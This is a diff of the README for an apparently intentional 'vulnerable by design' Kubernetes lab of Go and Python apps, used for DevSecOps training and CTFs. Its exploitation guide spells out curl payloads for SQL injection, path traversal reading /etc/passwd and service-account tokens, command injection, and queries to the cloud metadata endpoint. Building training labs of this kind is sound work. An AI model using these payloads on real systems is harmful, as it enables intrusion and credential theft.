@@ -1,77 +1,75 @@
-# Vulnerable K8s Go App 🚀
+# Vulnerable Cloud-Native Labs 🚀
 **Maintained by [peachycloudsecurity.com](https://peachycloudsecurity.com)**
 
-This is a "Vulnerable by Design" Go application built to demonstrate **OWASP Kubernetes Top 10 (2025)** risks and common web vulnerabilities. It is intended for security research, CTFs, and DevSecOps training.
+This repository contains multi-language applications (Go & Python) built to demonstrate **OWASP Kubernetes Top 10 (2025)** risks and common web vulnerabilities. It is intended for security research, CTFs, and DevSecOps training.
 
 ---
 
-## 🛠 Features
-* **Built-in Logging:** Real-time tracking of Method, Path, Timestamp, and Remote IP.
-* **Index Page:** Custom landing page at `/` for branding and navigation.
-* **Lightweight:** Pure Go implementation (no CGO/SQLite dependencies) for easy portability.
-* **K8s Focused:** Specifically crafted to test Pod escapes and Lateral Movement.
+## 📁 Project Structure
+* **vulnerable-go-app/**: Golang implementation focusing on SQLi, Path Traversal, and Command Injection.
+* **vulnerable-python-app/**: Python implementation focusing on Command Injection and K8s environment leaks.
+* **manifests/**: Kubernetes YAMLs for deploying both applications with Insecure Configurations (K01).
+
+---
+
+## 🛠 Features (Across All Apps)
+* **Built-in Logging:** Real-time tracking of Method, Path, Timestamp, and Remote IP for auditing.
+* **Health Checks:** Includes `/healthz` and `/readyz` endpoints for Kubernetes probes.
+* **K8s Focused:** Specifically crafted to test Pod escapes (HostPath) and Lateral Movement.
 
 ---
 
 ## 🚀 Quick Start
 
 ### 1. Run with Docker
+**Go App:**
 ```bash
 docker pull peachycloudsecurity/vulnerable-go-app:latest
 docker run -p 8080:8080 peachycloudsecurity/vulnerable-go-app:latest
 ```
 
-### 2. Run Locally
+**Python App:**
 ```bash
-cd webapp
-go run main.go
+docker pull peachycloudsecurity/vulnerable-python-app:latest
+docker run -p 8081:8080 peachycloudsecurity/vulnerable-python-app:latest
 ```
 
 ---
 
 ## 🛡️ Vulnerability Lab (Exploitation Guide)
 
-### 1. SQL Injection (UNION-based)
+### 1. SQL Injection (Go App)
 **Endpoint:** `/db?id=`
-The application simulates a backend database vulnerable to string concatenation.
+* **Exploit:** `curl "http://localhost:8080/db?id=1+OR+1=1"`
+* **Exfiltration:** `curl "http://localhost:8080/db?id=1+UNION+SELECT+secret+FROM+users"`
 
-* **Baseline:** `curl "http://localhost:8080/db?id=1"` (Normal response)
-* **Probing:** `curl "http://localhost:8080/db?id=1'"` (Behavior check)
-* **Exploit:** `curl "http://localhost:8080/db?id=1+OR+1=1"` (Logic bypass)
-* **Exfiltration:** `curl "http://localhost:8080/db?id=1+UNION+SELECT+secret+FROM+users"` (Extracts Flag)
-
-### 2. Path Traversal (K01: Insecure Workload Config)
-**Endpoint:** `/config?source=`
-Simulates stealing Kubernetes Service Account tokens or sensitive system files.
-
+### 2. Path Traversal & Host Escape (Go & Python)
+**Endpoint:** `/config?source=` (Go) | `/mnt/host/` (Exploit Pod)
 * **Exploit:** `curl "http://localhost:8080/config?source=/etc/passwd"`
-* **K8s Attack:** `curl "http://localhost:8080/config?source=/var/run/secrets/kubernetes.io/serviceaccount/token"`
+* **K8s Escape:** Read host files via `vulnerable-exploit-pod` mounted at `/mnt/host`.
 
-### 3. Command Injection (K08: Lateral Movement)
-**Endpoint:** `/exec?run=`
-Simulates a compromised container allowing an attacker to reach the Cloud Metadata Service (IMDS).
-
-* **Exploit:** `curl "http://localhost:8080/exec?run=whoami;id;ls"`
-* **Lateral Movement:** `curl "http://localhost:8080/exec?run=curl+s+http://169.254.169.254/latest/meta-data/"`
+### 3. Command Injection (Python & Go)
+**Endpoint:** `/ping` (Python - UI) | `/exec?run=` (Go)
+* **Python Exploit:** Input `127.0.0.1; whoami; id` in the Ping utility.
+* **Go Exploit:** `curl "http://localhost:8080/exec?run=ls+/var/run/secrets/kubernetes.io/serviceaccount/"`
 
 ---
 
 ## 🚢 Kubernetes Deployment
-Deploy using the provided manifests to test **Privileged** container escapes:
+Deploy using the provided manifests to test **Privileged** container escapes on NodePorts `30080` (Go) and `30081` (Python):
 
 ```bash
-kubectl apply -f manifests/deployment.yaml
-```
+# Deploy Go App
+kubectl apply -f vulnerable-go-app/manifests/deployment.yaml
 
-**Vulnerabilities included in K8s Manifest:**
-* **K01:** Running as `root` and `privileged: true`.
-* **K03:** Hardcoded secrets in code.
-* **K06:** Exposed via LoadBalancer/NodePort.
+# Deploy Python App
+kubectl apply -f vulnerable-python-app/manifests/deployment.yaml
+```
 
 ---
 
 ### GNU General Public License v3.0
-This project is licensed under the **GPL-3.0 License**. You are free to copy, modify, and distribute this software, provided that all derivative works remain under the same license. See the \`LICENSE\` file for the full text.
+This project is licensed under the **GPL-3.0 License**. You are free to copy, modify, and distribute this software, provided that all derivative works remain under the same license. See the `LICENSE` file for the full text.
 
 ### ⚠️ Disclaimer
 **FOR EDUCATIONAL PURPOSES ONLY.** Using this tool against target systems without explicit prior permission is illegal. **peachycloudsecurity** and its contributors are not responsible for any misuse, damage, or legal consequences caused by this software. Use it only in controlled lab environments.
@@ -105,4 +103,3 @@ If this tool helps you secure your infrastructure, consider supporting our educa
 [Sponsor on GitHub](https://github.com/sponsors/peachycloudsecurity)
 
 Your support helps us create more free educational content and security tools for the community.
-
